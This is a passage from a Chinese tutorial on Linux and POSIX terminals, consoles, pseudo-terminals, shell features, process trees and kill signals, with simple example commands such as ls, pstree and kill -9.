-<p>　　顺便说一下：<br>　　由于【<code>Ctrl + S</code>】在 Windows 上是很常见的组合键。某些菜鸟刚开始玩 Linux 命令行的时候，会习惯性地按这个组合键，结果就禁用了回显。这时候，任何键盘输入都没有反应。菜鸟就以为终端死掉了。</p>
-<h3 id="◇历史演变-1"><a href="#◇历史演变-1" class="headerlink" title="◇历史演变"></a>◇历史演变</h3><p>　　对于 Windows 用户来说，【<code>Ctrl + S</code>】实在太常用了，很容易误按。肯定有大量的用户吐槽过 POSIX 终端的这个快捷键。<br>　　那么，为啥要用这两个快捷键来控制“回显”捏？俺又要第 N 次说到【电传打字机】了。<br>　　由于这玩意儿的输出是【打印纸】，其速率比较【慢】。一旦“对方发送字符的速率”高于“自己这边的打印速率”，就需要向对方发一个控制信号，让对方暂停发送；等到自己这边打印完了，再发送另一个控制字符，通知对方继续。<br>　　（注：上述这种玩法，通信领域行话称之为“流量控制/流控”）<br>　　当年用来表示“暂停发送”的控制字符，对应的就是【<code>Ctrl + S</code>】；用来“恢复发送”的控制字符，也正是【<code>Ctrl + Q</code>】。</p>
-<h2 id="★（早期的）系统控制台-物理控制台（system-console）"><a href="#★（早期的）系统控制台-物理控制台（system-console）" class="headerlink" title="★（早期的）系统控制台/物理控制台（system console）"></a>★（早期的）系统控制台/物理控制台（system console）</h2><p>　　（前面说了）在【没】发明“分时系统”之前，当时的计算机只能执行【单任务】。因此，那时候的大型机只有【一个】操作界面，称之为【控制台】。<br>　　话说那时的“控制台”，真的是一个台子（参见下图）。</p>
-<p><img src="https://lh3.googleusercontent.com/vc0kCy3x_3ds8LNeFUpgcE7HljoCBVAD1T-857bjeMUGIBweBrX32gZ27A5c7I2ChXLOljlh3h8_1iIYp39EvlNSn9w5x5zu5CTxWlO6W1aBV6qilF9pt0aq7MXCcZkq2SHMKS_5pt8" alt="不见图 请翻墙"><br>（上世纪50年代，IBM 公司 704 大型机的控制台）</p>
-<p>　　后来发明了“分时系统”。如刚才所说——“分时系统”使得大型机可以具备多个终端。在这种情况下，你可以把“控制台”通俗地理解为“本地终端”，而【不】是“控制台”的那些终端，称之为“远程终端”。<br>　　在那个年代，计算机属于【非常非常稀缺】的资源。于是拥有大型机的公司，就可以【出租计算资源】，获得一笔相当可观的收入。他们把大型机的某个“远程终端”租给外来人员使用，然后根据“时间/空间”收取费用。由于资源的稀缺性，当年的 CPU 是按【秒】计费，而内存是按【KB】计费。<br>　　由于“远程终端”可能会被【外人】使用，因此对“远程终端”的【权限】要进行一些限制。如果要进行一些高级别的操作（比如“关闭整个系统”），就只能限制在【控制台】（本地终端）进行。有些公司为了安全起见，还会把“控制台”单独锁在某个“secured room”里面。</p>
-<p><img src="https://lh3.googleusercontent.com/5AlRxQhR00CvQ3DSO-idsyShNRJAOMIGL1J5I3b1UE1kW1dZVE5gU8mBenZUF_DMxwi0nHYd6ju7J6JsdApfarb3E_1_jBJQ2fL4SMm60k34xVToDm41jWoHfZOY32nZEhJW247zx3U" alt="不见图 请翻墙"><br>（上世纪60年代，DEC 公司 PDP-7 小型机的控制台）</p>
-<h2 id="★（如今的）虚拟控制台（virtual-console）"><a href="#★（如今的）虚拟控制台（virtual-console）" class="headerlink" title="★（如今的）虚拟控制台（virtual console）"></a>★（如今的）虚拟控制台（virtual console）</h2><p>　　到了 PC 时代，传统意义上的【控制台】已经看不到了。但 console 这个术语保留了下来。</p>
-<h3 id="◇从“物理-console”到“虚拟-console”"><a href="#◇从“物理-console”到“虚拟-console”" class="headerlink" title="◇从“物理 console”到“虚拟 console”"></a>◇从“物理 console”到“虚拟 console”</h3><p>　　早期大型机的 console 是【独占】硬件滴——“键盘/显示器”固定用于某个 console 滴。<br>　　【现代】的 POSIX 系统，衍生出“virtual console”的概念——可以让几个不同的 console【共用】一套硬件（键盘/显示器）。“virtual”一词就是这么来滴。<br>　　再重复唠叨一下：不论是早期的“物理控制台”还是后来的“虚拟控制台”，都属于广义上的“终端”。</p>
-<h3 id="◇举例：Linux-的-virtual-console"><a href="#◇举例：Linux-的-virtual-console" class="headerlink" title="◇举例：Linux 的 virtual console"></a>◇举例：Linux 的 virtual console</h3><p>　　假设你的 Linux 系统没安装图形界面（或者默认不启用图形界面），当系统启动完成之后，你会在屏幕上看到一个文本模式的登录提示。这个界面就是 virtual console 的界面。<br>　　在默认情况下，Linux 内置了【6个】virtual console 用于命令行操作，然后把第7个 virtual console 预留给图形系统。你可以使用 <code>Alt + Fn</code> 或 <code>Ctrl + Alt + Fn</code> 在这几个 console 之间切换（注：上述所说的 <code>Fn</code> 指的是 F1、F2… 之类的功能键）。</p>
-<h3 id="◇虚拟控制台的【内部结构】"><a href="#◇虚拟控制台的【内部结构】" class="headerlink" title="◇虚拟控制台的【内部结构】"></a>◇虚拟控制台的【内部结构】</h3><p><img src="https://lh6.googleusercontent.com/8rNRQNmIjTgBgt2N9RQQuzPJ4FP-03PcZfURXegbfEWowJ2XpAVNm3beOKXEVOJIbFmrDUQi3EqylMhxr2igKvHVp95rP1cyKgtl8He00YemHrCUAtOzjZSE48C6bkWibmun8pJFOEI" alt="不见图 请翻墙"><br>（TTY 示意图2：【虚拟控制台】的内部结构图）</p>
-<h2 id="★终端模拟器（terminal-emulator）"><a href="#★终端模拟器（terminal-emulator）" class="headerlink" title="★终端模拟器（terminal emulator）"></a>★终端模拟器（terminal emulator）</h2><p>　　请注意上面那张示意图，图中出现了一个【终端模拟器】，这就是本章节要说的东东。<br>　　如果你对比前面的【TTY 示意图1】与【TTY 示意图2】的变化，会发现——“UART ＆ UART 驱动”没了，然后多了这个【终端模拟器】。<br>　　多出来的这个玩意儿相当于加了一个【抽象层】，模拟出早期硬件终端的效果，因此就【无需改动】系统内核中的其它部分，比如：LDISC（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Line_discipline">line discipline</a>）<br>　　请注意，这个场景下的“终端模拟器”位于操作系统【内核】。换句话说，它属于【内核态】的模拟器。正是因为它处于这个地位，所以能够在“驱动”＆“LDISC”之间进行协调。</p>
-<h2 id="★伪终端（PTY-pseudotty-pseudoterminal）"><a href="#★伪终端（PTY-pseudotty-pseudoterminal）" class="headerlink" title="★伪终端（PTY/pseudotty/pseudoterminal）"></a>★伪终端（PTY/pseudotty/pseudoterminal）</h2><h3 id="◇从“文本模式”到“图形模式”"><a href="#◇从“文本模式”到“图形模式”" class="headerlink" title="◇从“文本模式”到“图形模式”"></a>◇从“文本模式”到“图形模式”</h3><p>　　前面讲的那些，都是【文本模式】（文本界面）。<br>　　话说到了上世纪80年代，随着【图形界面】的兴起，就出现某种需求——想在图形界面下使用“【文本】终端”。于是就出现了“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Pseudoterminal">伪终端</a>”的概念。<br>　　通俗地说，“伪终端”就是用某个图形界面的软件来模拟传统的“文本终端”的各种行为。前面说了，TTY 这个缩写相当于“终端”的同义词；因此“pseudotty” 就衍生出 PTY 这个缩写。</p>
-<h3 id="◇从“【内核态】终端模拟器”到“【用户态】终端模拟器”"><a href="#◇从“【内核态】终端模拟器”到“【用户态】终端模拟器”" class="headerlink" title="◇从“【内核态】终端模拟器”到“【用户态】终端模拟器”"></a>◇从“【内核态】终端模拟器”到“【用户态】终端模拟器”</h3><p>　　在上一个章节中，emulator 运行在系统内核中，因此是“内核态模拟器”；<br>　　等到后来搞“伪终端”的时候，就直接把这个玩意儿从【内核态】转到【用户态】——让它直接运行在【桌面环境】。如此一来，用户就可以直接在桌面环境中使用“终端模拟器”。<br>　　当“终端模拟器”变为【用户态】，它就【无法】直接与“键盘驱动 or 显卡驱动”打交道。在这种情况下，由“GUI 系统”（比如：X11）负责与这些驱动打交道，然后再把用户的输入输出转交给“终端模拟器”。</p>
-<p>　　下面这张示意图是 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Xterm">xterm</a>。别看它长得丑，它的出现也算是“里程碑”了。</p>
-<p><img src="https://lh5.googleusercontent.com/2GRHQZetZPor718nRQB0D4JPscPyssaw4c2ufUOa-EF73PWb-SmTFNJYjILwZ5znmpzX6qEdHrT5-1R83TmZAKUVzr4IhfdRMYmpZQmZC16qqIcaaJOESrJUX798-qtrtUSIE9lEUH4" alt="不见图 请翻墙"><br>（xterm——“图形化终端模拟器”的祖师爷）</p>
-<h3 id="◇内部结构示意图-1"><a href="#◇内部结构示意图-1" class="headerlink" title="◇内部结构示意图"></a>◇内部结构示意图</h3><p>　　很多人把“emulator”与“PTY”混为一谈。实际上两者处于【不同】层次。<br>　　在操作系统内部（内核），PTY 分为两部分实现，分别叫做“PTY master” ＆ “PTY slave”。master 负责与“terminal emulator”打交道；而用户通过 emulator 里面的 shell 启动的其它进程，则与 slave 打交道。<br>　　在这个环节中，“PTY slave”又进一步缩写为“PTS”。如果你用 <code>ps</code> 命令查看系统中的所有进程，经常会看到 PTS 之类的字样，指的就是这个玩意儿。对普通用户而言，看到的是“终端模拟器”的界面，至于 PTY 内部的 master ＆ slave，通常是感觉不到滴。</p>
-<p>　　为了让大伙儿更加直观，再放一张 PTY 的结构示意图。</p>
-<p><img src="https://lh6.googleusercontent.com/58f8TOJpw7rR6_oGBLI9nVPiW1jBVddKBH30UTzWL3n8pyY4RSvF19SAJK-lkymlteMNeyffOHDXOXKYnHehTF2-2Hep1Q4bhwBTHdDkax3uDy1kR-3a75DvxvH-LD2ggRTXUojHmy4" alt="不见图 请翻墙"><br>（TTY 示意图3：【伪终端】的内部结构图）</p>
-<h2 id="★shell——命令行解释器"><a href="#★shell——命令行解释器" class="headerlink" title="★shell——命令行解释器"></a>★shell——命令行解释器</h2><p>　　费了好多口水，咱们终于聊到 shell 了。<br>　　顺便吐槽一下：<br>　　扫盲命令行的教程，很少会像俺这样，从最基本的概念说起。其导致的后果就是——很多人（甚至包括很多 Linux 程序员）都搞不清“shell、terminal、console、TTY、PTY、PTS”这些概念到底有啥区别。<br>　　在《<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2019/10/Systematic-Learning.html">如何【系统性学习】——从“媒介形态”聊到“DIKW 模型”</a>》一文中，俺特别强调了【基本概念/基础知识】的重要性。这也就是俺为啥前面要费这么多口水的原因。</p>
-<h3 id="◇shell-VS-terminal"><a href="#◇shell-VS-terminal" class="headerlink" title="◇shell VS terminal"></a>◇shell VS terminal</h3><p>　　前面所说的“终端”（terminal），本质上是：<strong>基于【文本】的输入输出机制</strong>。它并【不】理解具体的命令及其语法。<br>　　于是就需要引入 shell 这个玩意儿——shell 负责解释你输入的命令，并根据你输入的命令，执行某些动作（包括：启动其它进程）。</p>
-<h3 id="◇常见-shell-举例"><a href="#◇常见-shell-举例" class="headerlink" title="◇常见 shell 举例"></a>◇常见 shell 举例</h3><p>　　常见的 shell 包括如下这些（为避免排名纠纷，按字母序列出）：</p>
-<blockquote>
-<p>bash<br>csh<br>fish<br>ksh<br>zsh</p>
-</blockquote>
-<p>　　在维基百科的“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Comparison_of_command_shells">这个页面</a>”，列出了各种各样的 shell 及其功能特性的对照表。<br>　　如今影响力最大的 shell 是 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Bash_(Unix_shell)">bash</a>（没有之一）。其名称源自“Bourne-again shell”，是 GNU 社区对 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Bourne_shell">Bourne shell</a> 的重写，使之符合自由软件（GPL 协议）。<br>　　本文后续章节对 shell 的举例，如果没有做特殊说明，均指 bash 这个 shell。</p>
-<h2 id="★shell-的基本功能"><a href="#★shell-的基本功能" class="headerlink" title="★shell 的基本功能"></a>★shell 的基本功能</h2><h3 id="◇显示【命令行提示符】"><a href="#◇显示【命令行提示符】" class="headerlink" title="◇显示【命令行提示符】"></a>◇显示【命令行提示符】</h3><p>　　当你打开一个 shell，会看闪烁的光标左侧显示一个东东，那个玩意儿就是【命令行提示符】（参见下图）</p>
-<p><img src="https://lh5.googleusercontent.com/q5gzYkmF9TWwGKHNRJKXgE2EhnVrHdCuKSb_bij_33qGNGlHgLCg-FUmFqTGG0ySOa2r7ftvwcW8H1p1CwnGt_9F9q1Kb2PeeZlACYUk5B540yV0AxoLDcfaeSjjT62NeuEGh2hlYi8" alt="不见图 请翻墙"><br>（截图中的“命令行提示符”包含了：用户名、当前路径、$分隔符）</p>
-<p>　　很多 shell 的“命令行提示符”都会包含【当前路径】。当你用 <code>cd</code> 命令切换目录，提示符也会随之改变。这有助于你搞清楚当前在哪个目录下，<strong>可以有效避免误操作</strong>。<br>　　下面这张图演示了——“命令行提示符”随着当前目录的变化而变化。</p>
-<p><img src="https://lh6.googleusercontent.com/RY0bVcLsYb8NFwMCu2XFeYEtaNopq9mI-XHZguPCFF7ojalynKSebm1LWVrENzZk_8msixbqyzGae8y5MxysSu2Q_GNl7N9l8AGt9ltXwsr5nUt-XWIuQH0l-scWPyO0qkm-y_D1oJs" alt="不见图 请翻墙"></p>
-<p>　　大部分 shell 都可以让你自定义这个【命令行提示符】，使之显示更多的信息量。<br>　　比如说，可以让它显示：当前的时间、主机名、上一个命令的退出码……<br>　　（注：如果你需要开多个【远程】终端，去操作多个【不同】的系统，“主机名”就蛮有用）</p>
-<h3 id="◇解析用户输入的【命令行】"><a href="#◇解析用户输入的【命令行】" class="headerlink" title="◇解析用户输入的【命令行】"></a>◇解析用户输入的【命令行】</h3><p>　　假设你想看一下 <code>/home</code> 这个目录下有哪些子目录，可以在 shell 中运行了如下命令：</p>
-<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">ls</span> <span class="hljs-string">/home</span><br></code></pre></td></tr></table></figure>
-
-<p>　　当你输入这串命令并敲回车键，shell 会拿到这一行，然后它会分析出，空格前面的 <code>ls</code> 是一个外部命令，空格后面的 <code>/home</code> 是该命令的参数。<br>　　然后 shell 会启动这个外部命令对应的进程，并把上述参数作为该进程的启动参数。</p>
-<h3 id="◇内部命令-VS-外部命令"><a href="#◇内部命令-VS-外部命令" class="headerlink" title="◇内部命令 VS 外部命令"></a>◇内部命令 VS 外部命令</h3><p>　　（刚才提到了【外部命令】这个词汇，顺便解释一下）<br>　　通俗地说，“内部命令”就是内置在 shell 中的命令；而“外部命令”则对应了某个具体的【可执行文件】。<br>　　当你在 shell 中执行“外部命令”，shell 会启动对应的可执行文件，从而创建出一个“子进程”；而如果是“内部命令”，就【不】产生子进程。<br>　　那么，如何判断某个命令是否为“外部命令”捏？<br>　　比较简单的方法是——用如下方式来帮你查找。如果某个命令能找到对应的可执行文件，就是“外部命令”；反之则是“内部命令”。</p>
-<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">whereis</span> 命令名称<br></code></pre></td></tr></table></figure>
-
-
-<h3 id="◇翻译【通配符】"><a href="#◇翻译【通配符】" class="headerlink" title="◇翻译【通配符】"></a>◇翻译【通配符】</h3><p>　　玩过命令行的同学，应该都知道：“星号”（<code>*</code>）与“问号”（<code>?</code>）可以作为通配符，用来模糊匹配文件名。<br>　　当你在 shell 中执行的命令包含了上述两个通配符，实际上是 shell 先把”通配符“翻译成具体的文件名，然后再传给相应命令。</p>
-<h3 id="◇翻译某些【特殊符号】"><a href="#◇翻译某些【特殊符号】" class="headerlink" title="◇翻译某些【特殊符号】"></a>◇翻译某些【特殊符号】</h3><p>　　比如说：在 POSIX 系统中，通常用 <code>~</code> 来表示当前用户的【主目录】（home 目录）。<br>　　如果你在 shell 中用到了 <code>~</code> 这个符号，shell 会先把该符号翻译成“home 目录的【全路径】”，然后再传给相应命令。</p>
-<h3 id="◇翻译【别名】"><a href="#◇翻译【别名】" class="headerlink" title="◇翻译【别名】"></a>◇翻译【别名】</h3><p>　　很多 POSIX 的 shell 都支持用 <code>alias</code> 命令设置别名（把一个较长的命令串，用一个较短的别名来表示）。<br>　　设置了别名之后，当你在 shell 中使用“别名”，由 shell 帮你翻译成原先的命令串。</p>
-<p>　　举例：<br>俺使用如下命令创建了 <code>nc-tor</code> 这个别名。</p>
-<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">alias nc-tor=&#x27;nc -X 5 -x 127.0.0.1:<span class="hljs-number">9050</span>&#x27;<br></code></pre></td></tr></table></figure>
-<p>　　设置完之后，当你在 shell 中执行了这个 <code>nc-tor</code> 命令，shell 会把它自动翻译成 <code>nc -X 5 -x 127.0.0.1:9050</code></p>
-<h3 id="◇历史命令"><a href="#◇历史命令" class="headerlink" title="◇历史命令"></a>◇历史命令</h3><p>　　大部分 shell 都会记录历史命令。你可以使用某些设定的快捷键（通常是【向上】的方向键），重新运行之前执行过的命令。</p>
-<h3 id="◇自动补全"><a href="#◇自动补全" class="headerlink" title="◇自动补全"></a>◇自动补全</h3><p>　　很多 shell 都具备自动补全的功能。<br>　　该功能不仅指“命令”本身的自动补全，还包括对“命令的参数”进行自动补全。</p>
-<h3 id="◇操作“环境变量”"><a href="#◇操作“环境变量”" class="headerlink" title="◇操作“环境变量”"></a>◇操作“环境变量”</h3><p>　　关于这部分，在下面的“环境变量”章节单独聊。</p>
-<h3 id="◇“管道”与“重定向”"><a href="#◇“管道”与“重定向”" class="headerlink" title="◇“管道”与“重定向”"></a>◇“管道”与“重定向”</h3><p>　　关于这部分，在下面的“管道”章节单独聊。</p>
-<h3 id="◇“进程控制”与“作业控制”"><a href="#◇“进程控制”与“作业控制”" class="headerlink" title="◇“进程控制”与“作业控制”"></a>◇“进程控制”与“作业控制”</h3><p>　　关于这部分，在下面的“进程控制”与“作业控制”章节单独聊。</p>
-<h2 id="★进程的启动与退出"><a href="#★进程的启动与退出" class="headerlink" title="★进程的启动与退出"></a>★进程的启动与退出</h2><h3 id="◇进程的【启动】及其【父子关系】"><a href="#◇进程的【启动】及其【父子关系】" class="headerlink" title="◇进程的【启动】及其【父子关系】"></a>◇进程的【启动】及其【父子关系】</h3><p>　　一般来说，每个“进程”都是由另一个进程启动滴。如果“进程A”创建了“进程B”，则 A 是【父进程】，B 是【子进程】（这个“父子关系”很好理解——因为完全符合直觉）<br>　　有些同学会问，那最早的【第一个】进程是谁启动滴？<br>　　一般来说，第一个进程由【操作系统内核】（kernel）亲自操刀运行起来；而 kernel 又是由“引导扇区”中的“boot loader”加载。</p>
-<h3 id="◇进程树"><a href="#◇进程树" class="headerlink" title="◇进程树"></a>◇进程树</h3><p>　　在 POSIX 系统（Linux ＆ UNIX），所有的进程构成一个【单根树】的层次关系。进程之间的“父子关系”，体现在“进程树”就是树上的【父子节点】。<br>　　你可以使用如下命令，查看当前系统的“进程树”。</p>
-<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pstree</span><br></code></pre></td></tr></table></figure>
-
-
-<p><img src="https://lh3.googleusercontent.com/oyi3HQTSxSr8Jyov0B1gGtwvQrjuWsScmpmZamLS8KfpLAIUzUZ5AaZem5fcOnYsAGewJoVKviqGMirk8QVRFfPFC3YYe-Dbh_-czN3M0M_HHgOQh0BvxrGMVPnj6g4wrlmiJZwPVBM" alt="不见图 请翻墙"><br>（“进程树”的效果图。注：为了避免暴露俺的系统信息，特意【不】用自己系统的截图）</p>
-<h3 id="◇初始进程"><a href="#◇初始进程" class="headerlink" title="◇初始进程"></a>◇初始进程</h3><p>　　一般情况下，POSIX 系统的“进程树”的【根节点】就是系统开机之后【第一个】创建的进程，并且其进程编号（PID）通常是 1。这个进程称之为“初始进程”。<br>　　（注：上述这句话并【不够】严密——因为某些 UNIX 衍生系统的“进程树”，位于根节点的进程【不是】“初始化进程”。这种情况与本文的主题没太大关系，俺不打算展开讨论）<br>　　对于“大部分 UNIX 衍生系统”以及“2010年之前的 Linux 发行版”，系统中的“初始进程”名叫 <code>init</code>；<br>　　如今越来越多的 Linux 发行版采用 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Systemd">systemd</a> 来完成系统引导之后的初始化工作。在这些发行版中，“初始进程”名叫 <code>systemd</code>。</p>
-<p>　　你可以用如下命令显示“进程树”中每个节点的“进程编号”（PID），然后就能看到编号为 1 的“初始进程”。</p>
-<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pstree -p</span><br></code></pre></td></tr></table></figure>
-
-
-<h3 id="◇进程的三种死法"><a href="#◇进程的三种死法" class="headerlink" title="◇进程的三种死法"></a>◇进程的三种死法</h3><p>　　关于进程如何死亡，大致有如下三种情况：</p>
-<p><strong>自然死亡</strong><br>　　如果某个进程把它该干的事情都干完了，自然就会退出。<br>　　这种是最常见的情况，也是最优雅的死法。俺习惯称作【自然死亡】。</p>
-<p><strong>自杀</strong><br>　　如果某个进程的工作干到半当中，突然收到某个通知，让它立即退出。<br>　　这时候，进程会赶紧处理一些善后工作，然后自行了断——这就是【自杀】。</p>
-<p><strong>它杀</strong><br>　　比“自杀”更粗暴的方式称之为【它杀】。也就是让“操作系统内核”直接把进程干掉。<br>　　在这种情况下，进程【不会】收到任何通知，因此也【不】可能进行任何善后事宜。</p>
-<p>　　（注：上述三种死法纯属比喻，以加深大伙儿的印象；不必太较真。十年前俺刚开博客，写过几篇帖子谈“<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2009/02/cxx-object-destroy-overview.html">C++ 对象之死</a>”，也用过类似比喻）<br>　　关于“自杀＆它杀”的方式，会涉及到【信号】。在下一个章节，俺会单独讨论【进程控制】，并会详细介绍“信号”的机制。</p>
-<h3 id="◇“孤儿进程”及其“领养”"><a href="#◇“孤儿进程”及其“领养”" class="headerlink" title="◇“孤儿进程”及其“领养”"></a>◇“孤儿进程”及其“领养”</h3><p>　　如果某个进程死了（退出了），而它的子进程还【没】死，那么这些子进程就被形象地称之为“孤儿”，然后会被上述提到的【初始进程】“领养”——“初始进程”作为“孤儿进程”的父进程。<br>　　对应到“进程树”——“孤儿进程”会被重新调整到“进程树根节点”的【直接下级】。</p>
-<h2 id="★“进程控制”与“信号”"><a href="#★“进程控制”与“信号”" class="headerlink" title="★“进程控制”与“信号”"></a>★“进程控制”与“信号”</h2><h3 id="◇用【Ctrl-C】杀进程"><a href="#◇用【Ctrl-C】杀进程" class="headerlink" title="◇用【Ctrl + C】杀进程"></a>◇用【Ctrl + C】杀进程</h3><p>　　为了演示这个效果，你可以执行如下命令：</p>
-<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ping</span> <span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure>
-
-<p>　　如果是 Windows 系统里的 <code>ping</code> 命令，它只会进行4次“乒操作”，然后就自己退出了；<br>　　但对于 POSIX 系统里面的 <code>ping</code> 命令，它会永远运行下去（直到被杀掉）。<br>　　当 ping 在运行的时候，只要你按下 <code>Ctrl + C</code> 这个组合键，就可以立即终止这个 <code>ping</code> 进程。</p>
-<h3 id="◇“Ctrl-C”背后的原理——【信号】（signal）"><a href="#◇“Ctrl-C”背后的原理——【信号】（signal）" class="headerlink" title="◇“Ctrl + C”背后的原理——【信号】（signal）"></a>◇“Ctrl + C”背后的原理——【信号】（signal）</h3><p>　　当你按下了 <code>Ctrl + C</code> 这个组合键，当前正在执行的进程会收到一个叫做【SIGINT】的信号。<br>　　如果进程内部定义了针对该信号的处理函数，那么就会去执行这个函数，完成该函数定义的一些动作。一般而言，该函数会进行一些善后工作，然后进程退出。<br>　　如果进程【没有】定义相应的处理函数，则会执行一个【默认动作】。对于 SIGINT 这个信号而言，默认动作就是“进程退出”。<br>　　上述这2种情况，都属于前面所说的自杀。这2种属于【常规情况】。</p>
-<p>　　下面再来说【特殊情况】——有时候 <code>Ctrl + C</code>【无法】让进程退出。为啥会这样捏？<br>　　假如说，编写某个进程的程序员，定义了该信号的处理函数，但在这个函数内部，并【没有】执行“进程退出”这个动作。那么当该进程收到 SIGINT 信号之后，自然就【不会】退出。这种情况称之为——<strong>信号被该进程【屏蔽】了</strong>。</p>
-<h3 id="◇【谁】发出“Ctrl-C”对应的信号？"><a href="#◇【谁】发出“Ctrl-C”对应的信号？" class="headerlink" title="◇【谁】发出“Ctrl + C”对应的信号？"></a>◇【谁】发出“Ctrl + C”对应的信号？</h3><p>　　很多人（包括很多玩命令行的老手）都有一个【误解】——他们误以为是 shell 发送了 SIGINT 信号给当前进程。<strong>其实不然！</strong><br>　　在上述 ping 的例子中，当 ping 进程在持续运行之时，你的键盘输入是关联到 ping 进程的“标准输入”（stdin）。在这种情况下，shell 根本【无法】获取你的按键信息。<br>　　实际上，是【终端】获取了你的 <code>Ctrl + C</code> 组合键信息，并发送了 SIGINT 信号。因为【终端】处于更底层，它负责承载你所有的输入输出。因此，它当然可以截获用户的某个特殊的组合键（比如：<code>Ctrl + C</code>），并执行某些特定的动作。<br>　　聊到这里，大伙儿会发现——<br>如果没有正确理解“终端”与“shell”这两者的关系，就会犯很多错误（造成很多误解）。</p>
-<p>　　有的读者可能会问：“终端”如何知道【当前进程】是哪一个？（能想到这点，通常是比较爱思考滴）<br>　　俺来解答一下：<br>　　当 shell 启动了某个进程，它当然可以拿到这个进程的编号（pid），于是 shell 会调用某个系统 API（比如 <code>tcsetpgrp</code>）把“进程编号”与 shell 所属的“终端”关联起来。<br>　　当“终端”需要发送 SIGINT 信号时，再调用另一个系统 API（比如 <code>tcgetpgrp</code>），就可以知道当前进程的编号。</p>
-<h3 id="◇对比杀进程的几个信号：SIGINT、SIGTERM、SIGQUIT、SIGKILL"><a href="#◇对比杀进程的几个信号：SIGINT、SIGTERM、SIGQUIT、SIGKILL" class="headerlink" title="◇对比杀进程的几个信号：SIGINT、SIGTERM、SIGQUIT、SIGKILL"></a>◇对比杀进程的几个信号：SIGINT、SIGTERM、SIGQUIT、SIGKILL</h3><p><strong>SIGINT</strong><br>　　在大部分 POSIX 系统的各种终端上，<code>Ctrl + C</code> 组合键触发的就是这个信号。<br>　　通常情况下，进程收到这个信号后，做完相关的善后工作，就自行了断（自杀）。</p>
-<p><strong>SIGTERM</strong><br>　　这个信号基本类似于 SIGINT。<br>　　它是 <code>kill</code> ＆ <code>killall</code> 这两个命令【默认】使用的信号。<br>　　也就是说，当你用这俩命令杀进程，并且【没有】指定信号类型，那么 <code>kill</code> 或 <code>killall</code> 用的就是这个 SIGTERM 信号。</p>
-<p><strong>SIGQUIT</strong><br>　　这个信号类似于前两个（SIGINT ＆ SIGINT），差别在于——进程在退出前会执行“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Core_dump">core dump</a>”操作。<br>　　一般而言，只有程序员才会去关心“core dump”这个玩意儿，所以这里就不细聊了。</p>
-<p><strong>SIGKILL</strong><br>　　在杀进程的几个信号中，这个信号是是最牛逼的（也是最粗暴的）。<br>　　前面三个信号都是【可屏蔽】滴，而这个信号是【不可屏蔽】滴。<br>　　当某个进程收到了【SIGKILL】信号，该进程自己【完全没有】处理信号的机会，而是由操作系统内核直接把这个进程干掉。<br>　　此种行为可以形象地称之为“它杀”。<br>　　当你用下列这些命令杀进程，本质上就是在发送这个信号进行【它杀】。【SIGKILL】这个信号的编号是 <code>9</code>，下列这些命令中的 <code>-9</code> 参数就是这么来滴。</p>
-<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-keyword">kill</span> -<span class="hljs-number">9</span> 进程号<br><span class="hljs-keyword">kill</span> -<span class="hljs-keyword">KILL</span> 进程号<br><br>killall -<span class="hljs-number">9</span> 进程名称<br>killall -<span class="hljs-keyword">KILL</span> 进程名称<br>killall -SIGKILL 进程名称<br></code></pre></td></tr></table></figure>
-
-<p>　　为了方便对照上述这4种，俺放一个表格如下：</p>
-<table>
-<thead>
-<tr>
-<th>信号名称</th>
-<th>编号</th>
-<th>能否屏蔽</th>
-<th>默认动作</th>
-<th>俗称</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>SIGINT</td>
-<td>2</td>
-<td>YES</td>
-<td>进程自己退出</td>
-<td>自杀</td>
-</tr>
-<tr>
-<td>SIGTERM</td>
-<td>15</td>
-<td>YES</td>
-<td>进程自己退出</td>
-<td>自杀</td>
-</tr>
-<tr>
-<td>SIGQUIT</td>
-<td>3</td>
-<td>YES</td>
-<td>执行 core dump 进程自己退出</td>
-<td>自杀</td>
-</tr>
-<tr>
-<td>SIGKILL</td>
-<td>9</td>
-<td>NO</td>
-<td>进程被内核干掉</td>
-<td>它杀</td>
-</tr>
-</tbody></table>
-<h3 id="◇【它杀】的危险性与副作用"><a href="#◇【它杀】的危险性与副作用" class="headerlink" title="◇【它杀】的危险性与副作用"></a>◇【它杀】的危险性与副作用</h3><p>　　请注意：<strong>【它杀】是一种比较危险的做法，可能导致一些【副作用】。</strong>只有当你用其它各种方式都无法干掉某个进程，才考虑用这招。<br>　　有读者在评论区问到了“它杀的副作用”，俺简单解释一下：<br>　　一方面，当操作系统用这种方式杀掉某个进程，虽然可以把很多内存相关的资源释放掉，但【内存之外】的资源，内核就管不了啦；另一方面，由于进程遭遇“它杀”，无法完成某些善后工作。<br>　　基于上述两点，就【有可能】会产生副作用。另外，“副作用的严重程度”取决于不同类型的软件。无法一概而论。</p>
